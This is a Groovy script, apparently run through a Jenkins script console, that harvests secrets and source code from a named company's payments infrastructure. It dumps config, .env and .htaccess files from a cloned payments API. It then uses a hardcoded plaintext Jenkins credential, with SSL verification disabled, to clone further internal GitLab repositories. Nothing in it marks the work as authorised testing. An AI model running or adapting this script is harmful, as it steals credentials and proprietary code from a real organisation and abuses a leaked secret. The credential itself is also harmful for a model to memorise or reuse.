// MICRO-Q: Read FULL caja-pagos-api config + find all repos
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(8000)
}

// Check if the repo is already cloned in /tmp
println "=== ALREADY CLONED REPOS ==="
println run("ls /tmp/gl_* 2>/dev/null | head -20")

// Read full caja-pagos-api local.php
println "\n=== FULL caja-pagos-api/config/local.php ==="
println run("cat /tmp/gl_claroshop_caja-pagos-api/config/local.php 2>/dev/null")

// List ALL files in caja-pagos-api
println "\n=== ALL FILES in caja-pagos-api ==="
println run("find /tmp/gl_claroshop_caja-pagos-api -type f 2>/dev/null | grep -v '.git/' | head -50")

// Read other sensitive files
[".env", ".env.example", ".env.production", "app/config.php", "config/config.php",
 "app/Bootstrap/App.php", ".htaccess"].each { f ->
    def content = run("cat /tmp/gl_claroshop_caja-pagos-api/${f} 2>/dev/null")
    if (content.trim()) {
        println "\n=== ${f} ==="
        println content
    }
}

// Also list files in monedero-api
println "\n=== monedero-api FILES ==="
println run("find /tmp/gl_claroshop_monedero-api -type f 2>/dev/null | grep -v '.git/' | head -40")

// Try to clone more repos (from known job descriptions)
def auth = "jenkins:e6LBqIkOI\$PR1XX2oia"
["claroshop/monedero", "claroshop/tienda", "claroshop/axii",
 "claroshop/t1-admin-api", "claroshop/claroshop-v1-api",
 "claroshop/selfservice", "claroshop/searchengine-api"].each { repo ->
    def dest = "/tmp/gl_try_${repo.replace('/','_')}"
    def cloneUrl = "https://${auth}@gitlab.dev.claroshop.com/${repo}.git"
    def r = run("GIT_TERMINAL_PROMPT=0 git -c http.sslVerify=false clone --depth=1 '${cloneUrl}' '${dest}' 2>&1 | tail -2")
    if (!r.contains("not found") && !r.contains("ERROR") && !r.contains("Repository not found")) {
        println "\n  CLONED: ${repo}"
    }
}

println "\n=== /tmp ls after clones ==="
println run("ls /tmp/gl_try_* 2>/dev/null | head -20")

println "\n=== DONE MICRO-Q ==="
